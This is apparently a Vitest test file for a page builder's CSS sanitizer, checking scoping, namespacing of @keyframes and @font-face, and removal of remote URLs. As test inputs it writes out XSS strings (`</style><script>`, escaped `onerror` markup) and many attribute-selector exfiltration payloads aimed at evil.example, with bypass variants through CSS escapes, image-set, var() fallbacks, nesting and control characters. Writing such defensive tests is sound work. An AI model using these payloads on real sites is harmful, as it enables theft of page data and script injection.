import {
  escapeIdentifier,
  findUnnamespacedGlobals,
  namespacedGlobalName,
} from "@nextlyhq/blocks-engine";
import { describe, it, expect } from "vitest";

import {
  MAX_RULE_NESTING,
  MAX_VALUE_NESTING,
  sanitizeBlockCss,
  sanitizeCustomCss,
} from "./css-sanitize";

const SCOPE = "nx-pb-page-abc";

/** `.n1 { .n2 { … { body } } }`, nested exactly `depth` rules deep. */
const nestRule = (depth: number, body: string): string => {
  let css = body;
  for (let i = depth; i >= 1; i -= 1) css = `.n${i} { ${css} }`;
  return css;
};

/** The sanitized CSS alone; the warnings have their own suite below. */
const clean = (css: string, scope: string): string =>
  sanitizeCustomCss(css, scope).css;
const cleanBlock = (css: string, scope: string): string =>
  sanitizeBlockCss(css, scope).css;

describe("sanitizeCustomCss", () => {
  it("scopes a simple rule under the page root", () => {
    const out = clean(".hero { color: red }", SCOPE);
    expect(out).toContain(`.${SCOPE} .hero`);
    expect(out).toContain("color:red");
  });

  it("drops declarations with javascript: / expression()", () => {
    const js = clean(".a { background: url(javascript:alert(1)) }", SCOPE);
    expect(js.toLowerCase()).not.toContain("javascript:");
    const expr = clean(".a { width: expression(alert(1)) }", SCOPE);
    expect(expr.toLowerCase()).not.toContain("expression(");
  });

  it("strips @import", () => {
    const out = clean('@import url("evil.css"); .a { color: red }', SCOPE);
    expect(out.toLowerCase()).not.toContain("@import");
    expect(out).toContain(`.${SCOPE} .a`);
  });

  it("cannot end the style element it is emitted into", () => {
    // The property that matters, stated directly. An earlier version of this
    // test asserted that the text "<script" was absent, which described how the
    // sanitizer happened to work rather than what it guarantees: it stripped
    // four literal tag spellings and did nothing about `<img onerror=…>`.
    //
    // Nothing can close the element now, so markup left in the text is inert:
    // inside a `<style>`, only `</style` ends the raw-text run. `<` is not
    // escaped wholesale because `@media (400px<width)` is valid CSS and
    // escaping there would break the query.
    const out = clean(
      ".hero { color: red } </style><script>alert(1)</script>",
      SCOPE
    );
    expect(out).not.toContain("</style");
    expect(out).not.toContain("</script");
    expect(out).toContain(`.${SCOPE} .hero`);
  });

  it("escapes markup an author hid behind a CSS escape", () => {
    // `csstree.generate` decodes escapes, so this reaches the page as literal
    // `</style>` even though the source contains no markup. Filtering the input
    // cannot see it; only the generated text can.
    const out = clean(
      `.a { content: "\\3c /style>\\3c img src=x onerror=alert(1)>" }`,
      SCOPE
    );
    expect(out).not.toContain("</style");
    expect(out).toContain("\\3c /style>");
  });

  it("keeps an escaped sequence meaning the same thing", () => {
    // `\3c` and `<` are one character to a CSS parser, so the author still gets
    // what they wrote; only the bytes the HTML parser sees change.
    expect(clean(`.a { content: "</div>" }`, SCOPE)).toContain(
      `content:"\\3c /div>"`
    );
  });

  it("leaves the angle brackets that valid CSS needs", () => {
    expect(clean(".a > .b { color: red }", SCOPE)).toContain(".b{color:red}");
    const range = clean(
      "@media (400px < width < 800px) { .a { color: red } }",
      SCOPE
    );
    expect(range).toContain("400px < width < 800px");
  });

  it("scopes a rule without rewriting what is inside a pseudo-class", () => {
    // `:not()`, `:is()` and `:has()` hold selectors of their own. Prefixing
    // those asks a different question than the author did: `.a:has(> .b)`
    // scoped inside becomes `.a:has(.scope > .b)`, which no longer means "has a
    // child .b".
    expect(clean(".a:not(.b) { color: red }", SCOPE)).toBe(
      `.${SCOPE} .a:not(.b){color:red}`
    );
    expect(clean(".a:is(.b, .c) { color: red }", SCOPE)).toBe(
      `.${SCOPE} .a:is(.b,.c){color:red}`
    );
    expect(clean(".a:has(> .b) { color: red }", SCOPE)).toBe(
      `.${SCOPE} .a:has(>.b){color:red}`
    );
  });

  it("scopes every part of a selector list", () => {
    expect(clean(".a, .b { color: red }", SCOPE)).toBe(
      `.${SCOPE} .a,.${SCOPE} .b{color:red}`
    );
  });

  it("preserves @media and scopes the rules inside it", () => {
    const out = clean("@media (max-width: 640px) { .a { color: red } }", SCOPE);
    expect(out).toContain("@media");
    expect(out).toContain(`.${SCOPE} .a`);
  });

  it("does not throw on malformed CSS and still scopes recoverable rules", () => {
    const out = clean(".a { color: red }}} .b { x: 1 }", SCOPE);
    expect(typeof out).toBe("string");
    expect(out).toContain(`.${SCOPE}`);
  });

  it("returns empty string for empty input", () => {
    expect(clean("", SCOPE)).toBe("");
  });
});

describe("sanitizeBlockCss", () => {
  it("rewrites the `selector` keyword to the block scope class", () => {
    const out = cleanBlock("selector { color: red; }", "nx-pb-abc");
    expect(out).toContain(".nx-pb-abc");
    expect(out).toContain("color:red");
    expect(out).not.toMatch(/(^|[^-.])selector\b/);
  });

  it("scopes descendant selectors under the block", () => {
    const out = cleanBlock(
      "selector .title { font-weight: 700; }",
      "nx-pb-abc"
    );
    expect(out).toContain(".nx-pb-abc");
    expect(out).toContain(".title");
  });

  it("scopes a bare selector under the block too", () => {
    const out = cleanBlock("p { margin: 0; }", "nx-pb-abc");
    expect(out).toMatch(/\.nx-pb-abc\s+p/);
  });

  it("drops dangerous declarations", () => {
    const out = cleanBlock(
      "selector { background: url(javascript:alert(1)); }",
      "nx-pb-abc"
    );
    expect(out).not.toContain("javascript");
  });

  it("does not double-scope a selector already prefixed with the block class", () => {
    // Written with the class already at the front, which is what the
    // already-scoped branch actually looks for. Passing `selector { … }` here
    // exercised the keyword rewrite instead and would have passed whether or
    // not that branch existed.
    const out = cleanBlock(".nx-pb-abc .title { color: red; }", "nx-pb-abc");
    expect(out).not.toMatch(/\.nx-pb-abc\s+\.nx-pb-abc/);
    expect(out).toContain(".nx-pb-abc .title");
  });
});

describe("custom CSS may not reach off this origin", () => {
  // The channel this closes: a selector that matches only on a prefix, plus a
  // URL that fires a request when it does, reads a value out one character at a
  // time. Custom CSS is the only surface where an author controls both.
  const EXFILTRATION = `input[value^="a"] { background: url("https://evil.example/a") }`;

  it("removes a declaration that fetches from another origin", () => {
    const out = sanitizeCustomCss(EXFILTRATION, SCOPE);
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
  });

  it("removes every scheme, not a list of the dangerous ones", () => {
    // The allowlist is "no scheme at all", so a scheme nobody thought to ban is
    // refused for the same reason as the ones they did.
    for (const url of [
      "https://evil.example/a.png",
      "http://evil.example/a.png",
      "//evil.example/a.png",
      "data:image/svg+xml,<svg/>",
      "chrome-extension://abc/x.png",
      "webcal://evil.example/x",
    ]) {
      const out = sanitizeCustomCss(`.a { background: url("${url}") }`, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.css).not.toContain("data:");
      expect(out.warnings.length).toBeGreaterThan(0);
    }
  });

  it("reads a scheme spelled with CSS escapes", () => {
    // `csstree` decodes the URL, so the check sees what a browser would fetch
    // rather than what the author typed.
    const out = sanitizeCustomCss(
      `.a { background: url("\\68 ttps://evil.example/a") }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
  });

  it("reads a URL a function carries as a bare string", () => {
    // `image-set("…" 1x)` fetches the string. css-tree calls it a String rather
    // than a Url, so a walker looking only for Url nodes never sees it, and the
    // whole channel reopens through a spelling.
    for (const css of [
      `.a { background-image: image-set("https://evil.example/a.png" 1x) }`,
      `.a { background-image: -webkit-image-set("https://evil.example/a.png" 1x) }`,
      `.a { background: image("https://evil.example/a.png") }`,
    ]) {
      const out = sanitizeCustomCss(css, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
  });

  it("leaves a string that is text rather than an argument", () => {
    // The other half of that rule. A bare string is a caption, not a request,
    // and refusing it would break showing a URL on the page.
    for (const css of [
      `.a { content: "https://example.com" }`,
      `.a { font-family: "https://example.com" }`,
    ]) {
      const out = sanitizeCustomCss(css, SCOPE);
      expect(out.warnings).toEqual([]);
    }
  });

  it("resolves backslashes the way a URL parser does", () => {
    // For http and https a backslash is a slash, so these reach another host
    // while beginning with neither `//` nor a scheme.
    // Four backslashes here is two in the CSS source, which is ONE after the
    // CSS string decodes — the literal backslash a URL parser reads as a slash.
    // Two in this file would be one in the source, where `\\e` is a CSS escape
    // for U+000E and reaches no host at all.
    for (const url of ["/\\\\evil.example/a", "\\\\\\\\evil.example/a"]) {
      const out = sanitizeCustomCss(`.a { background: url("${url}") }`, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
  });

  it("reads a URL hidden in a custom property", () => {
    // A custom property holds an arbitrary token stream, so css-tree gives its
    // value as `Raw` and a walk over the parsed value sees nothing inside it.
    // The URL still fetches the moment anything says `var(--probe)`.
    const out = sanitizeCustomCss(
      `input[value^="a"] { --probe: url("https://evil.example/a"); background: var(--probe) }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
    // The same reach, through a function rather than url().
    expect(
      sanitizeCustomCss(
        `.a { --x: image-set("https://evil.example/a" 1x) }`,
        SCOPE
      ).css
    ).not.toContain("evil.example");
  });

  it("reads a URL out of a var() fallback", () => {
    // css-tree puts a `var()` fallback in a nested `Raw`, so a check that only
    // re-parsed the value's ROOT missed it — and the browser substitutes the
    // fallback in and makes the request.
    const out = sanitizeCustomCss(
      `input[value^="a"] { background: var(--missing, url("https://evil.example/a")) }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
    // Nested one level further, since the re-parse recurses.
    expect(
      sanitizeCustomCss(
        `.a { background: var(--x, var(--y, url("https://evil.example/a"))) }`,
        SCOPE
      ).css
    ).not.toContain("evil.example");
  });

  it("reads a URL substituted into a URL-taking function", () => {
    // `var()` is transparent: its fallback becomes whatever encloses the
    // `var()`, so this fetches even though the string's nearest function is
    // `var`. Position is decided by the nearest function that is NOT a
    // substitution.
    const out = sanitizeCustomCss(
      `input[value^="a"] { background-image: image-set(var(--missing, "https://evil.example/a.png") 1x) }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
    // The same transparency must NOT make a caption's fallback a URL.
    expect(
      sanitizeCustomCss(
        `.a { content: var(--label, "https://example.com") }`,
        SCOPE
      ).warnings
    ).toEqual([]);
  });

  it("reads inside a nested rule, at every depth it follows", () => {
    // css-tree leaves a nested rule as a `Raw` child of its parent's block, so
    // a declaration-only walk never sees the URL inside it.
    for (const css of [
      `input[value^="a"] { .probe { background: url("https://evil.example/a") } }`,
      `.a { .b { .c { background: url("https://evil.example/a") } } }`,
      nestRule(MAX_RULE_NESTING, `background: url("https://evil.example/a")`),
    ]) {
      const out = sanitizeCustomCss(css, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
    // And an ordinary nested rule survives untouched at any depth the scan
    // follows. The shallow cases are what people write; the last is the edge of
    // what the bound permits, which is where an off-by-one would show.
    for (const depth of [1, 2, 3, 5, MAX_RULE_NESTING]) {
      const out = sanitizeCustomCss(nestRule(depth, "color: red"), SCOPE);
      expect(out.warnings).toEqual([]);
      // Spacing is not normalised at every level: a nested rule is re-emitted
      // from the text the parser left it as, while the outermost declaration
      // goes through the generator. Both keep the declaration, which is the
      // property under test.
      expect(out.css.replace(/\s+/g, "")).toContain("color:red");
      expect(out.css).toContain(`.n${depth}`);
    }
  });

  it("reads inside a rule nested in a group at-rule", () => {
    // Both rules and at-rules have blocks, and a rule nested in either arrives
    // as `Raw`. A walk that read only `Rule` blocks missed this entirely: the
    // inner rule is a `Raw` child of the `@media`, not of the rule around it,
    // so the selector-plus-URL pair reached the page with no warning.
    for (const css of [
      `.nx-pb-page { @media (min-width:0px) { .probe:has(input[value^="a"]) { background:url("https://evil.example/a") } } }`,
      `.a { @supports (display:grid) { .probe { background:url("https://evil.example/b") } } }`,
      `.a { @media (min-width:0px) { @supports (display:grid) { .probe { background:url("https://evil.example/c") } } } }`,
    ]) {
      const out = sanitizeCustomCss(css, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
    // An ordinary rule nested in a group at-rule is untouched, which is the
    // common case and the cost of getting this wrong.
    const fine = sanitizeCustomCss(
      `.a { @media (min-width:0px) { color: red } }`,
      SCOPE
    );
    expect(fine.warnings).toEqual([]);
    expect(fine.css.replace(/\s+/g, "")).toContain("color:red");
  });

  it("reads a declaration written after a nested rule", () => {
    // CSS nesting allows declarations on either side of a nested rule, and
    // css-tree hands the whole block over as one `Raw`. Re-parsed as a
    // stylesheet the nested rule becomes a Rule and the trailing declaration
    // stays a top-level `Raw` belonging to no block, which a collector that
    // only looked inside blocks walked straight past.
    for (const css of [
      `input[value^="a"] { .child { color: red } background: url("https://evil.example/a") }`,
      `.a { .child { color: red } background-image: url("https://evil.example/b") }`,
    ]) {
      const out = sanitizeCustomCss(css, SCOPE);
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
    // The same shape with nothing remote in it is untouched.
    const fine = sanitizeCustomCss(
      `.a { .child { color: red } color: blue }`,
      SCOPE
    );
    expect(fine.warnings).toEqual([]);
    expect(fine.css).toContain("color: blue");
  });

  it("refuses attr() where the value would be fetched", () => {
    // The URL never appears in the stylesheet: it arrives from a DOM attribute
    // at use time, so the scan has no literal to judge and a selector can make
    // the request conditional on a secret. Refused as unreadable rather than
    // as a remote URL, because no host was named.
    for (const value of [
      "background-image: image-set(attr(data-probe) 1x)",
      "background: -webkit-image-set(attr(data-probe) 1x)",
      "list-style-image: image(attr(data-probe))",
      "border-image-source: image-set(attr(data-probe) 1x)",
    ]) {
      const out = sanitizeCustomCss(`.a{${value}}`, SCOPE);
      expect(
        out.warnings.map(w => w.code),
        value
      ).toEqual(["unchecked"]);
      expect(out.warnings[0]?.message, value).toContain("attr()");
      expect(out.css, value).not.toContain("attr(");
    }
  });

  it("refuses url(attr(...)), which no parser can read as a URL", () => {
    // `url()` takes a URL token or a string, never a function, so this is a
    // parse error rather than an attr() the walk can see — and it is reported
    // as one. It is covered here because the outcome is what matters: the
    // declaration is removed either way, so the shape cannot reach the page
    // while being described by a different reason than the cases above.
    const out = sanitizeCustomCss(
      ".a{background-image: url(attr(data-probe))}",
      SCOPE
    );
    expect(out.warnings.map(w => w.code)).toEqual(["unchecked"]);
    expect(out.css).not.toContain("attr(");
  });

  it("leaves attr() alone where it is read as text", () => {
    // `content: attr(data-label)` is the ordinary, specified use and fetches
    // nothing. A refusal that fired on it would break the one thing attr() is
    // universally supported for.
    for (const value of [
      "content: attr(data-label)",
      'content: "x" attr(data-label) "y"',
      "font-family: local(attr(data-face))",
    ]) {
      const out = sanitizeCustomCss(`.a::before{${value}}`, SCOPE);
      expect(out.warnings, value).toEqual([]);
      expect(out.css, value).toContain("attr(");
    }
  });

  it("refuses attr() in a custom property, which can land anywhere", () => {
    // A custom property is checked as though its value could be used in any
    // position, because the declaration that uses it carries no literal of its
    // own to inspect.
    const out = sanitizeCustomCss(".a{--probe: attr(data-probe)}", SCOPE);
    expect(out.warnings.map(w => w.code)).toEqual(["unchecked"]);
    expect(out.css).not.toContain("attr(");
  });

  it("refuses nesting past the bound as unchecked, not as a URL", () => {
    // Rules deeper than the scan follows are still removed — unreadable is not
    // safe — but the reason given has to be the real one. Reporting them as
    // remote URLs sent authors looking for a host their CSS never named, and
    // fired on valid stylesheets: the deepest CSS in this repository nests five
    // levels, so a bound anywhere near that is hit by ordinary output.
    const out = sanitizeCustomCss(
      nestRule(MAX_RULE_NESTING + 1, "color: red"),
      SCOPE
    );
    expect(out.warnings.map(w => w.code)).toEqual(["unchecked"]);
    expect(out.warnings[0]?.message).toContain("levels deep");
    // Removed all the same, so a URL hiding below the bound never lands.
    const hidden = sanitizeCustomCss(
      nestRule(
        MAX_RULE_NESTING + 1,
        `background: url("https://evil.example/a")`
      ),
      SCOPE
    );
    expect(hidden.css).not.toContain("evil.example");
  });

  it("follows a var() fallback chain as deep as real ones go", () => {
    // A design-token stack walks `var()` through several tiers before it
    // bottoms out in a literal. Refusing those as remote URLs deleted valid
    // declarations and blamed a host that appears nowhere in them.
    for (const depth of [1, 2, 3, 4, 6, MAX_VALUE_NESTING]) {
      let inner = "red";
      for (let i = depth; i >= 1; i -= 1) inner = `var(--v${i}, ${inner})`;
      const out = sanitizeCustomCss(`.a { color: ${inner} }`, SCOPE);
      expect(out.warnings).toEqual([]);
      expect(out.css).toContain("red");
    }
  });

  it("refuses a remote-looking custom property, wherever it lands", () => {
    // `--probe: "https://evil"` is a bare string where it is DEFINED and an
    // image URL where it is used. Which it becomes is decided at the use, in a
    // declaration holding no string of its own to inspect, so nothing at
    // definition time can know — and it is refused rather than guessed at.
    const out = sanitizeCustomCss(
      `.a { --probe: "https://evil.example/a.png"; background-image: image-set(var(--probe) 1x) }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
    // A custom property that is plainly not a URL is untouched, which is the
    // overwhelmingly common case and the cost of getting this wrong.
    expect(
      sanitizeCustomCss(`.a { --gap: 12px; padding: var(--gap) }`, SCOPE)
        .warnings
    ).toEqual([]);
  });

  it("treats attr() as a substitution, not as text", () => {
    // `attr()` looked text-taking because its fallback usually is text. But
    // `image-set(attr(x, "https://…") 1x)` consumes that fallback as an image,
    // so it inherits its position the way `var()` does.
    const out = sanitizeCustomCss(
      `.a { background-image: image-set(attr(data-probe, "https://evil.example/a.png") 1x) }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
    expect(out.warnings.map(w => w.code)).toContain("remote-url");
    // And a caption's fallback is still a caption.
    expect(
      sanitizeCustomCss(`.a { content: attr(data-label, "a caption") }`, SCOPE)
        .warnings
    ).toEqual([]);
  });

  it("leaves an ordinary fallback alone", () => {
    // The other side: most fallbacks are values, not URLs, and refusing them
    // would break the commonest use of `var()` there is.
    for (const css of [
      `.a { background: var(--bg, #fff) }`,
      `.a { color: var(--c, red) }`,
      `.a { --gap: 12px; padding: var(--gap) }`,
    ]) {
      expect(sanitizeCustomCss(css, SCOPE).warnings).toEqual([]);
    }
  });

  it("strips the leading controls a URL parser strips", () => {
    // "Remove any leading and trailing C0 control or space from input" — C0 is
    // U+0000 to U+001F, and `trim()` does not cover it, so a scheme behind
    // U+0001 survived while resolving to the same host.
    for (const escape of ["\\1 ", "\\8 ", "\\1f "]) {
      const out = sanitizeCustomCss(
        `.a { background: url("${escape}https://evil.example/a") }`,
        SCOPE
      );
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
  });

  it("removes the whitespace a URL parser removes", () => {
    // Tab and newline are stripped OUT of a URL by the parser, so `h<TAB>ttps:`
    // is fetched as `https:` while matching no scheme pattern.
    for (const escape of ["\\9 ", "\\a "]) {
      const out = sanitizeCustomCss(
        `.a { background: url("h${escape}ttps://evil.example/a") }`,
        SCOPE
      );
      expect(out.css).not.toContain("evil.example");
      expect(out.warnings.map(w => w.code)).toContain("remote-url");
    }
  });

  it("treats an unclassified function as able to fetch", () => {
    // The allowlist names the functions whose strings are TEXT. Anything else
    // is checked, so a function nobody has classified fails closed rather than
    // opening the channel by being new.
    const out = sanitizeCustomCss(
      `.a { background: some-future-fn("https://evil.example/a") }`,
      SCOPE
    );
    expect(out.css).not.toContain("evil.example");
  });

  it("leaves a textual fallback alone", () => {
    // The other side of that allowlist. `attr()` and `counter()` take text, and
    // telling an author to upload a file because their caption looks like a URL
    // is a real cost for no security gain.
    for (const css of [
      `.a { content: attr(data-label, "https://example.com") }`,
      `.a { content: counter(x, "https://example.com") }`,
    ]) {
      expect(sanitizeCustomCss(css, SCOPE).warnings).toEqual([]);
    }
  });

  it("keeps the paths that resolve against this site", () => {
    for (const url of ["/media/hero.png", "./hero.png", "hero.png", "#frag"]) {
      const out = sanitizeCustomCss(`.a { background: url("${url}") }`, SCOPE);
      expect(out.css).toContain("background");
      expect(out.warnings).toEqual([]);
    }
  });

  it("says what went and offers a remedy that actually works", () => {
    // A declaration that vanished without explanation is the thing authors file
    // bugs about, and their own source still contains the line that did not
    // survive, so there is nothing to read back.
    //
    // The remedy has to be reachable, which "upload it to the media library"
    // was not: with a cloud storage adapter the media record's URL is itself
    // off-origin, so following that advice produced a URL this refuses again.
    const out = sanitizeCustomCss(
      `.a { background: url("https://fonts.example/x.woff2") }`,
      SCOPE
    );
    expect(out.warnings).toHaveLength(1);
    expect(out.warnings[0]?.message).toContain("background");
    expect(out.warnings[0]?.message).toContain("fonts.example");
    expect(out.warnings[0]?.message).toContain("same-origin path");
    expect(out.warnings[0]?.message).not.toContain("media library");
  });

  it("reports an at-rule it cannot support, rather than dropping it quietly", () => {
    const out = sanitizeCustomCss(
      `@import url("/local.css"); .a { color: red }`,
      SCOPE
    );
    expect(out.css).not.toContain("@import");
    expect(out.warnings.map(w => w.code)).toContain("unsupported-at-rule");
    expect(out.warnings[0]?.message).toContain("@import");
    // Naming what IS allowed, so the refusal is actionable rather than a wall.
    expect(out.warnings[0]?.message).toContain("@keyframes");
  });

  describe("document-global names", () => {
    const ns = (name: string): string => namespacedGlobalName(name, SCOPE);

    it("keeps @keyframes, under a name that cannot collide", () => {
      const out = sanitizeCustomCss(
        `@keyframes fade { from { opacity: 0 } to { opacity: 1 } }`,
        SCOPE
      );
      expect(out.warnings).toEqual([]);
      expect(out.css).toContain(`@keyframes ${ns("fade")}`);
      // The bare name must be gone: a document and its host that both define
      // `fade` do not get one each, the later definition wins for both.
      expect(out.css).not.toMatch(/@keyframes\s+fade\b/);
    });

    it("points the author's own animation at the renamed keyframes", () => {
      const out = sanitizeCustomCss(
        `@keyframes fade { from { opacity: 0 } } .a { animation: fade 1s ease-in-out infinite }`,
        SCOPE
      );
      expect(out.css).toContain(
        `animation:${ns("fade")} 1s ease-in-out infinite`
      );
    });

    it("leaves a name the stylesheet did not define exactly as written", () => {
      // Deciding which ident in the shorthand is the NAME needs the grammar;
      // matching against what this stylesheet defined needs none. It also
      // keeps custom CSS able to use an animation the page itself provides.
      // A definition IS present, so the rewrite pass runs — otherwise this
      // asserts nothing about the guard, only that nothing happened at all.
      const out = sanitizeCustomCss(
        `@keyframes mine { from { opacity: 0 } } .a { animation: nx-fade-in 1s ease-in-out }`,
        SCOPE
      );
      expect(out.css).toContain("animation:nx-fade-in 1s ease-in-out");
    });

    it("keeps @font-face, under a family that cannot take over the host's", () => {
      // The sharp case: family names match case-insensitively, so redefining
      // `Inter` from inside a scoped region would restyle the whole site.
      const out = sanitizeCustomCss(
        `@font-face { font-family: Inter; src: url("/f.woff2") } .a { font-family: Inter, sans-serif }`,
        SCOPE
      );
      expect(out.css).not.toMatch(/font-family:\s*Inter\b/i);
      expect(out.css).toContain(ns("Inter"));
      // …and the author's own reference still resolves to their font.
      expect(out.css).toContain("sans-serif");
    });

    it("matches a family reference without regard to case, as CSS does", () => {
      const out = sanitizeCustomCss(
        `@font-face { font-family: "My Font"; src: url("/f.woff2") } .a { font-family: my font }`,
        SCOPE
      );
      // Declared "My Font", referenced `my font`: one family to CSS, so one
      // rewrite. A case-sensitive map would leave the reference dangling.
      expect(out.css.match(new RegExp(ns("My Font"), "g"))?.length).toBe(2);
    });

    it("drops a @font-face left with no font this site can load", () => {
      // The remote `src` goes to the origin policy; what is left declares a
      // family that resolves to nothing, and CSS does NOT fall back to the
      // next family when a face fails to load — it renders the default.
      const out = sanitizeCustomCss(
        `@font-face { font-family: X; src: url("https://fonts.example/f.woff2") }`,
        SCOPE
      );
      expect(out.css).not.toContain("@font-face");
      const message = out.warnings.map(w => w.message).join(" ");
      expect(message).toContain("upload the font file");
    });

    it("does not scope a keyframe step, which selects no element", () => {
      // `from`, `to` and `50%` are positions in an animation, not selectors.
      // Prefixed, they become `.scope from`, which matches nothing — and the
      // animation stops running with no warning anywhere.
      const out = sanitizeCustomCss(
        `@keyframes fade { from { opacity: 0 } 50% { opacity: .5 } to { opacity: 1 } }`,
        SCOPE
      );
      expect(out.css).not.toContain(`${SCOPE} from`);
      expect(out.css).toContain("from{opacity:0}");
      expect(out.css).toContain("50%{opacity:.5}");
    });

    it("leaves nothing the isolation invariant would call un-namespaced", () => {
      // The check the compiler's own output answers to, pointed at this
      // output. It is why the namespacing helper is shared rather than
      // reimplemented: two spellings of "namespaced" would let this pass while
      // the browser still resolved the name globally.
      const out = sanitizeCustomCss(
        `@keyframes fade { from { opacity: 0 } }
         @font-face { font-family: Inter; src: url("/f.woff2") }
         .a { animation: fade 1s; font-family: Inter }`,
        SCOPE
      );
      // Both at-rules must actually be there: a check that the output holds
      // no un-namespaced global is satisfied just as well by an output holding
      // no global, which is what refusing them again would produce.
      expect(out.css).toContain("@keyframes");
      expect(out.css).toContain("@font-face");
      expect(findUnnamespacedGlobals(out.css, SCOPE)).toEqual([]);
    });

    it("namespaces every font-family descriptor, not only the first", () => {
      // CSS applies the LAST valid `font-family` in a `@font-face`, so
      // namespacing the first leaves the effective family bare — the whole
      // collision, still open, behind a decoy that looks handled.
      const out = sanitizeCustomCss(
        `@font-face { font-family: decoy; font-family: Inter; src: url("/f.woff2") }`,
        SCOPE
      );
      expect(out.css).not.toMatch(/font-family:\s*["']?Inter["']?/i);
      expect(out.css).toContain(ns("Inter"));
    });

    it("reads an escaped descriptor as the property it is", () => {
      // `font\2d family` IS `font-family` to a browser, so a raw comparison is
      // one an author can write straight past — and the family stays global.
      const out = sanitizeCustomCss(
        `@font-face { font\\2d family: Inter; src: url("/f.woff2") }`,
        SCOPE
      );
      expect(out.css).not.toMatch(/:\s*Inter\b/i);
      expect(out.css).toContain(ns("Inter"));
    });

    it("reads an escaped keyframes name as the name it is", () => {
      // `@keyframes \66 ade` is named `fade`, so a plain `animation: fade`
      // reference has to find it after the rename.
      const out = sanitizeCustomCss(
        `@keyframes \\66 ade { from { opacity: 0 } } .a { animation: fade 1s }`,
        SCOPE
      );
      expect(out.css).toContain(`animation:${ns("fade")} 1s`);
      expect(out.css).toContain(`@keyframes ${ns("fade")}`);
    });

    it("rewrites a quoted keyframes reference too", () => {
      // `<keyframes-name>` is a custom-ident OR a string, so both spellings
      // have to follow the rename.
      const out = sanitizeCustomCss(
        `@keyframes "fade" { from { opacity: 0 } } .a { animation-name: "fade" }`,
        SCOPE
      );
      expect(out.css).toContain(`animation-name:"${ns("fade")}"`);
    });

    it("leaves an animation keyword alone even when it names a keyframes rule", () => {
      // A stylesheet may define `@keyframes infinite`; the `infinite` in
      // `animation: pulse 1s infinite` is still the iteration count, and
      // renaming it changes what the declaration says.
      const out = sanitizeCustomCss(
        `@keyframes infinite { from { opacity: 0 } } .a { animation: pulse 1s infinite }`,
        SCOPE
      );
      expect(out.css).toContain("animation:pulse 1s infinite");
    });

    it("leaves the font shorthand's style keyword alone", () => {
      // Everything before the font size is style, variant, weight or stretch.
      // A family called `italic` must not swallow the `italic` of
      // `font: italic 16px Arial`.
      const out = sanitizeCustomCss(
        `@font-face { font-family: italic; src: url("/f.woff2") } .a { font: italic 16px Arial }`,
        SCOPE
      );
      expect(out.css).toContain("font:italic 16px Arial");
    });

    it("still rewrites the family that follows the size", () => {
      const out = sanitizeCustomCss(
        `@font-face { font-family: Brand; src: url("/f.woff2") } .a { font: italic 16px/1.5 Brand, serif }`,
        SCOPE
      );
      expect(out.css).toContain(`16px/1.5"${ns("Brand")}",serif`);
    });

    it("follows a name through a custom property", () => {
      // `--anim: fade` only becomes a reference after `var()` substitution, so
      // nothing here can see the use — but leaving it makes the definition
      // rename break the animation with no trace in the output.
      const out = sanitizeCustomCss(
        `@keyframes fade { from { opacity: 0 } } .a { --anim: fade; animation: var(--anim) 1s }`,
        SCOPE
      );
      expect(out.css).toContain(`--anim:${ns("fade")}`);
    });

    it("follows a family through a custom property too", () => {
      const out = sanitizeCustomCss(
        `@font-face { font-family: Brand; src: url("/f.woff2") } .a { --f: Brand; font-family: var(--f) }`,
        SCOPE
      );
      expect(out.css).toContain(`--f:${ns("Brand")}`);
    });

    it("follows a quoted family through a custom property", () => {
      // The property holds the family `My Font`; the quotes are how it is
      // spelled, not part of the name. Matching the spelling finds nothing and
      // leaves the reference pointing at a family the rename took away.
      const out = sanitizeCustomCss(
        `@font-face { font-family: "My Font"; src: url("/f.woff2") }
         .a { --f: "My Font"; font-family: var(--f) }`,
        SCOPE
      );
      expect(out.css).toContain(`--f:"${ns("My Font")}"`);
    });

    it("ignores a font-family descriptor CSS itself would ignore", () => {
      // The descriptor is `<string> | <custom-ident>+`, so `"Bad" "Name"` is
      // not a family name and the browser keeps `Good`. Reading it as one
      // records a family the page never uses and leaves the one it does use
      // holding its global name.
      const out = sanitizeCustomCss(
        `@font-face { font-family: Good; font-family: "Bad" "Name"; src: url("/f.woff2") }
         .a { font-family: Good }`,
        SCOPE
      );
      expect(out.css).toContain(`font-family:"${ns("Good")}"`);
      expect(out.css).not.toMatch(/font-family:\s*Good\b/);
    });

    it("rewrites a quoted keyframes name that is spelled like a keyword", () => {
      // `@keyframes "none"` is a real animation and `animation-name: "none"`
      // references it, while the bare `none` is the keyword that cancels one.
      // The quotes are the only thing telling them apart.
      const out = sanitizeCustomCss(
        `@keyframes "none" { from { opacity: 0 } } .a { animation-name: "none" }`,
        SCOPE
      );
      expect(out.css).toContain(`animation-name:"${ns("none")}"`);
    });

    it("finds the family after a font size that is a word", () => {
      // `font: italic small Brand` has no measurement in it, and a shorthand
      // read as sizeless never reaches its family list.
      const out = sanitizeCustomCss(
        `@font-face { font-family: Brand; src: url("/f.woff2") } .a { font: italic small Brand }`,
        SCOPE
      );
      // The whole declaration, not just the name: the `@font-face` in the same
      // output holds that name too, so a bare containment check passes while
      // the reference this is about is left exactly as it was.
      expect(out.css).toContain(`font:italic small"${ns("Brand")}"`);
